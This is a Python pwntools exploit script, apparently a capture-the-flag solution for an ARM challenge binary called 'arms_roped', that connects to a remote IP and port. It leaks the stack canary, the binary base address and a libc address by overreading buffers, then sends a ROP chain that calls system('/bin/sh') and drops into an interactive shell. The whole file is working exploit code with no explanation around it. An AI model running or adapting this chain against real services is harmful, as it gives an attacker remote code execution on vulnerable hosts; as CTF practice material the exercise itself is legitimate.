from pwn import *

# Set up the binary and libraries
binary_path = './arms_roped'
libc_path = './lib/libc.so.6'
elf = ELF(binary_path)
libc = ELF(libc_path)

# Set the architecture and log level
context.arch = elf.arch
context.log_level = 'debug'

def connect_to_host() -> remote:
    """Establish a remote connection to the challenge host."""
    return remote("94.237.62.195",31571)

def leak_canary(remote_conn: remote) -> int:
    """Leak the stack canary value by overflowing a buffer."""
    remote_conn.sendline(b'A' * 0x21)
    remote_conn.recvuntil(b'A' * 0x21)
    canary = u32(remote_conn.recv(3)[-4:].rjust(4, b"\x00"))
    return canary

def leak_base_address(remote_conn: remote) -> tuple[int, int]:
    """Leak the base address of the binary."""
    payload = b"a" * 0x30
    remote_conn.sendline(payload)
    remote_conn.recvuntil(payload)
    leak = u32(remote_conn.recv(4).ljust(4, b"\x00"))
    base_addr = leak - 0x948
    return leak, base_addr

def leak_libc_address(remote_conn: remote) -> int:
    """Leak an address from the libc library to calculate offsets."""
    payload = b"a" * 0x48
    remote_conn.sendline(payload)
    remote_conn.recvuntil(payload)
    leak_addr = u32(remote_conn.recv(4).ljust(4, b"\x00"))
    libc_addr = leak_addr - 152 - 0x1748d
    return libc_addr

def create_payload(canary: int, base_addr: int, libc_addr: int) -> bytes:
    """Build the payload to execute a ROP chain."""
    # ROP gadgets offsets
    pop_r3_pc = base_addr + 0x56c
    mov_r0_r7_add_r4_r4_blx_r3 = base_addr + 0x9d8
    pop_r4_r5_r6_r7_r8_sb_sl_pc = base_addr + 0x9ec
    
    # Libc function and string offsets
    system_addr = libc_addr + 0x0002f511
    bin_sh_addr = libc_addr + 0x000dce0c

    # Build the payload with the ROP chain
    payload = cyclic(0x20)
    payload += p32(canary)
    payload += b'\x00' * 12
    payload += p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)
    payload += p32(0) * 3
    payload += p32(bin_sh_addr)
    payload += p32(0) * 3
    payload += p32(pop_r3_pc)
    payload += p32(system_addr) + p32(mov_r0_r7_add_r4_r4_blx_r3)
    
    return payload

def exploit():
    """Run the exploitation process."""
    p = connect_to_host()
    canary = leak_canary(p)
    _, base_addr = leak_base_address(p)
    libc_addr = leak_libc_address(p)
    
    payload = create_payload(canary, base_addr, libc_addr)
    
    p.sendline(payload)
    p.sendline(b"quit")
    p.interactive()

if __name__ == "__main__":
    exploit()

